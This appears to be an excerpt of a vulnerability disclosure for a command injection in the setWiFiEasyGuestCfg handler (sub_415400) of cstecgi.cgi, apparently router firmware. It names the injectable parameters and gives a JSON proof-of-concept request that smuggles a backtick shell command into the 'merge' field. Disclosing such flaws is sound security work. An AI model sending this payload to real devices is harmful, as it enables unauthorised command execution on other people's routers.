...
The vulnerability is located in the function `sub_415400` within `cstecgi.cgi`, also known as `setWiFiEasyGuestCfg`.

![](Pasted%20image%2020231128223953.png)
![](Pasted%20image%2020231128223920.png)

![](Pasted%20image%2020231128223827.png)
...
therefore , by controlling parameter among `merge accessEnabled2g time accessEnabled5g time5g` , we can finally make an arbitrary command execution
...
{"merge":"`id > /1.txt;`","topicurl":"setWiFiEasyGuestCfg","token":"00000000000000000000000000000000"}
~~~
...
![](Pasted%20image%2020231128223441.png)